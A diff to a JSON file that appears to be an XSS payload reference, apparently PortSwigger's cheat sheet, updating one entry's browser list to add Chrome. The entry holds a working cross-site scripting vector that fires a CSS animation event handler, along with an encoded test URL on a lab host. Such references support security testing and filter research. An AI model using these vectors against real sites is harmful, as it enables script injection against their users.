@@ -201,7 +201,7 @@
       {
         "tag": "*",
         "code": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><* id=x style=\"position:absolute;\" onanimationcancel=\"print()\"></*>",
-        "browsers": ["firefox"],
+        "browsers": ["chrome", "firefox"],
         "interaction": false,
         "url": "http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20onload%3D%22var%20that%3Dthis%3BsetTimeout%28function%28%29%7Bthat.src%3Dthat.src.replace%28%27%23%27%2C%27%23x%27%29%7D%2C500%29%3BsetTimeout%28x%3D%3Ethat.src%3Dthat.src.replace%28%27%23x%27%2C%27%23%27%29%2C1000%29%3B%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cstyle%3E%40keyframes%20x%7Bfrom%20%7Bleft%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%3C%2Fstyle%3E%3C*%20id%3Dx%20style%3Dposition%3Aabsolute%3B%20onanimationcancel%3Dprint%28%29%3Etest%3C%2F*%3E%23%22%3E"
       }
